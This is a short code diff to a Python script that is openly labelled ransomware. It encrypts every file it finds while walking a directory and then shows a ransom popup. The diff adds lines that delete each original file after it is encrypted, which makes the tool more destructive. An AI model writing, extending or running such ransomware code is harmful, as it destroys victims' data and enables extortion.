@@ -40,6 +40,8 @@ for root, dirs, files in os.walk(directory_path):
             print(f"File '{file_path}' Encrypted.")
             encrypt_file(file_path, key)
             time.sleep(1)
+            os.remove(file_path)
+            print(f"Normal file '{file_path}' is no more.")
 
 # Ransomware Popup
 message_text = "RANSOMWARE ALERT! Your files have been encrypted. Contact us for instructions on how to decrypt them."
